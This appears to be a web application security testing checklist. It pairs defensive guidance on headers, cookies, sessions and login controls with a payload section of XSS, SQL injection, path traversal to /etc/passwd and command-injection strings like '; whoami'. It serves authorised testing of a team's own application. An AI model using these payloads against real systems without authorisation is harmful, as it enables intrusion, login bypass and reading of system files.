The ratings provided in the checklist were primarily generating using CVSS V3.1 average scores for 2025 CVEs. Please use the following tools to create ratings that more accurately represent your application and organization's risk appetite:

https://owasp.org/www-community/OWASP_Risk_Rating_Methodology

https://www.first.org/cvss/calculator/4-0

## Continuous Review
Please continue to evaluate the continuous review section and response headers sections of the checklist throughout the entire assessment. We encourage app teams to update the checklist and payload lists with language specific links and relevant company policies to ensure future developers follow the organization's requirements.

### Error Messages are Properly Handled
Error messages should be short and generic. Do not show stack traces or informative messages to the user.

Resources: https://cheatsheetseries.owasp.org/cheatsheets/Error_Handling_Cheat_Sheet.html

### Autocomplete Disabled on Sensitive Input Fields
Emails, password, challenge questions, and other sensitive information should have autocomplete="off".

Resources: https://www.w3schools.com/howto/howto_html_autocomplete_off.asp

### Sensitive Information is Masked
Sensitive information should be masked to mitigate shoulder surfing attacks.

Resources: https://labex.io/tutorials/javascript-mask-a-value-28489

### Sensitive Information Not in URL
Do not send sensitive information in GET request parameters.

Resources: https://cwe.mitre.org/data/definitions/598.html

### Unneccessary Methods are Disabled
Do not allow unsafe methods such as Trace or Connect on any endpoint. Disable DELETE, POST, etc. if not needed on the endpoint.

Resources: https://cyberwhite.co.uk/http-verbs-and-their-security-risks/

### HTTP Disabled
Enforce HTTPS for all connections.

Resources: https://blog.matrixpost.net/redirect-from-http-to-https-using-the-iis-url-rewrite-module/

## Response Headers
The following tools will check the response headers of your application and report on any insecurities or misconfigurations. We highly recommend checking the response headers manually because these tools may not follow the requirements of your organization. Additionally, most of these tools are limited to unauthenticated checks, meaning that sensitive authenticated responses will not be evaluated.


Resources: https://securityheaders.com/

https://hackertarget.com/http-header-check/

### Content-Security-Policy 
The CSP should include script-src and default-src. Do not use unsafe directives, such as unsafe-inline or unsafe-eval. Do not include wildcards in the CSP unless they are used in the subdomain of a trusted site. 

Quick Guide: https://content-security-policy.com/

Evaulation Tool: https://csp-evaluator.withgoogle.com/

### Strict-Transport-Security
The Strict-Transport-Security response header should contain the max-age directive set to 1 year or greater and the includeSubdomains directive. If the application is externally available, include the Preload directive.

Example: Strict-Transport-Security: max-age=63072000; includeSubDomains; preload

Resources: https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Strict-Transport-Security

### Caching
**Cache-Control** - Set the cache-control response header to include the “no-store” flag in all responses.

**Expires** - Set the Expires header to a date in the past, or zero, in all responses.

Resources: https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Cache-Control

https://www.rfc-editor.org/rfc/rfc9111.html"

### Information Leak Headers
Remove unneccessary response headers, such as: Server, X-Powered-By, X-AspNet-Version.

Resources: https://support.waters.com/KB_Inf/Other/WKB202501_How_to_disable_the_Server_HTTP_header_in_Microsoft_IIS

### CORS Headers
Do not set Access-Control-Allow-Origin to wildcard or reflect arbitrary origins/subdomains.

Resources: https://www.freecodecamp.org/news/exploiting-cors-guide-to-pentesting/

## Cookies
All cookies should have the following attributes: Secure, HttpOnly, SameSite: lax or strict.

Resources: https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Set-Cookie

## Payloads Required Section
This payload list is an advanced version of the short payload list. Please watch the video series before attempting these exploits as some of the payloads have a lower success rate and require a deeper understanding of the application's behavior and vulnerable parameters.

While this list was curated from select payloads from my own personal notes(generated over the course of 3 years), most of the payloads can be found in the sources below. Please see the youtube video series where sources are provided in situations where we use direct content from a third party.

[https://github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

https://book.hacktricks.wiki/en/index.html

https://portswigger.net/web-security/all-topics


## Cross-Site Scripting (XSS)

Best resource for learning more about this vulnerability: [https://portswigger.net/web-security/cross-site-scripting](https://portswigger.net/web-security/cross-site-scripting)

Best payload list: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection

Enter the following payloads into user input fields and see how they are reflected in the application. If the user input is reflected back unencoded and unfiltered, especially in javascript, then XSS is likely.
```
<b>test</b> 
<script>alert(1)</script>
</scriscriptpt><scrscriptipt>alert()</scriscriptpt>
</script><script>alert(1)</script>
“><script>alert(1)</script>
“/><script>alert(1)</script>

<img src=1 onerror=alert(1)>
“/><img src=x onerror=”alert()”/>
<img/src='1'/onerror=alert(0)>

javascript:alert(document.cookie)

x” onerror=alert(1)>
"onload="alert(1)

${alert(1)}

alert`1`

'-alert()-’
';alert();//
\’-alert(1)//
```

***Polyglot payloads***

```
0xsobky
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

Mathias Karlsson
" onclick=alert(1)//<button ' onclick=alert(1)//> */ alert(1)//
```

## SQL Injection
Review the following site for a cheat sheet showing specific requirements and payloads for the most common databases. This will help tailor the following payloads to your environment. For example, if your application uses MySQL, replace the `--` in the commands below with `#`.

https://portswigger.net/web-security/sql-injection/cheat-sheet

```
Oracle Concat: 'foo’||’bar’
Oracle Comment: --comment
Oracle Version: SELECT banner FROM v$version
Oracle Time Delay:dbms_pipe.receive_message(('a’),10)

Microsoft Concat:'foo’+'bar’
Microsoft Comment: --comment or can use: /**comment*/*
Microsoft Version: SELECT @@version
Microsoft Time Delay:WAITFOR DELAY '0:0:10’

PostgreSQL Concat:'foo’||'bar’
PostgreSQL Comment: --comment or can use: /**comment*/*
PostgreSQL Version: SELECT version()
PostgreSQL Time Delay:SELECT pg_sleep(10)

MySQL Concat: 'foo’ 'bar’ or can use CONCAT('foo’,'bar’)
MySQL Comment: -- (space after the double dash) or can use: /**comment*/*
MySQL Version: SELECT @@version
MySQL Time Delay: SELECT SLEEP(10)

'
''
’ AND '1’=’1
’ AND '1’=’2

In MS-SQL we can use these queries to determine if the app is vulnerable to sql injection by using delays:
'; waitfor delay '0:30:0’--
1; waitfor delay '0:30:0’--
1)waitfor delay’0:0:10’--

Here are similar examples for PostgreSQL:
select 1 from pg_sleep(5)
;(select 1 from pg_sleep(5))
||(select 1 from pg_sleep(5))

(SELECT 1)
(SELECT 1+1)
(SELECT 'inputword’)

’ OR 1=1 -- 
OR 'a’=’a’-- 
1 OR 'a’=’a’--

If the first payload below returns a successful response and the second payload returns a false response, jump to the union select section.
' ORDER BY 1 --
' ORDER BY 25 --

### OR Sandwich Section
' OR 1=1 OR '
' OR sleep(5) OR '
'||(SELECT version())||'

### UNION SELECT Section
OR (1=1
1) OR (1=1
’) OR 1=1

```

## SQL Injection on Login Pages
**Username Field:**
```
'
''

admin' AND 1=1-- (may need different comment or space at end of comment)
admin'--
admin')--
admin' or 1=1--
admin') or 1=1-- -

If multiple accounts are being returned, we can use the following:
admin' or 1=1 limit 1 --

If spaces are not allowed, we can use  which needs to be encoded in our situation:
admin'%09OR%091=1%09--%09

If tabs and spaces are blocked:
admin'||1=1#
admin'||1#
```

**Password Field:**
```
'
''
' or 1=1#
' or 1=1--
') or 1=1#
') or 1=1-- -
```

## Directory Traversal
Please use a file/file path that exists on the web server. For example, etc/passwd if its a linux server and windows/win.ini if it is a windows server. Extend the ../ as needed.

```
../../../etc
../../../etc/passwd
....//....//....//etc/passwd
..%252f..%252f..%252fetc/passwd
../../../windows/win.ini

../../../../../../../../../../../../etc/passwd
../../../../../../../../../../../../windows/win.ini

`c:/inetpub/logs/logfiles`

Filename=/etc/passwd

Filename=….//….//….//etc/passwd
Append a null byte and valid file extension:
../../../etc/passwd%00.png

Another option is to double url encode the ../ characters.

..%252f..%252f..%252fetc/passwd
../
..\
..\/
%2e%2e%2f
%252e%252e%252f
%c0%ae%c0%ae%c0%af
%uff0e%uff0e%u2215
%uff0e%uff0e%u2216
```

## Command Injection
All "whoami" text can be replaced with "sleep 3."
```
+;+whoami
+&&+whoami
+|+whoami
+`whoami`
+$(whoami)
‘ | whoami
‘ | whoami ‘
‘ | whoami #
; sleep 3
||whoami||
||sleep 3||

 && sleep 3 &&
```

## Login Page
### Weak Passwords Not Allowed
Enforce strong password policies.

Resources: https://www.cisa.gov/secure-our-world/use-strong-passwords

### User Enumeration Not Possible
Ensure the application does not reflect different messages for valid or invalid users.

Resources: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/03-Identity_Management_Testing/04-Testing_for_Account_Enumeration_and_Guessable_User_Account


### Account Lockout Enabled
Lock user accounts after X number of failed login attempts to prevent brute-force attacks.

Resources: https://owasp.org/www-community/controls/Blocking_Brute_Force_Attacks

### Multi-Factor Authentication in Use
Require multi-factor authentication at login.

Resources: https://auth0.com/blog/different-ways-to-implement-multifactor/


## Session Management

### Session Fixation Not Possible
Issue fresh session cookies after login.

Resources: https://owasp.org/www-community/controls/Session_Fixation_Protection

### Session dies after X minutes
Invalidate session after X number of minutes.

Resources: https://learn.microsoft.com/en-us/office/vba/access/concepts/miscellaneous/detect-user-idle-time-or-inactivity

### Logout Button Works
Invalidate session upon logout.

Resources: https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html

### All functions require authentication
Review all application pages/functions to ensure only valid users can access the page and execute functions.

Resources: https://learn.microsoft.com/en-us/aspnet/core/security/authorization/simple?view=aspnetcore-9.0


## Miscellaneous
### Clickjacking
Use X-Frame-Options: DENY or frame-ancestors CSP directive to prevent clickjacking attacks.

Resources: https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html

### File upload
Only allow necessary file types. Virus scan each file and rename upon upload.

Resources: https://github.com/dilaouid/shitshit/blob/main/backend-good-practices-security/FILE_UPLOAD.md

https://github.gatech.edu/zsteele3/ZS6727Summer2025/blob/main/TestFiles.md

### Horizontal Privilege Escalation-IDOR
Ensure users cannot access resources that belong to other users.

Resources: https://purplesec.us/learn/privilege-escalation-attacks/

https://portswigger.net/web-security/access-control"

### Vertical Privilege Escalation-MFLAC
Ensure unauthorized users cannot execute privileged functionality.

Resources: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/03-Testing_for_Privilege_Escalation

https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html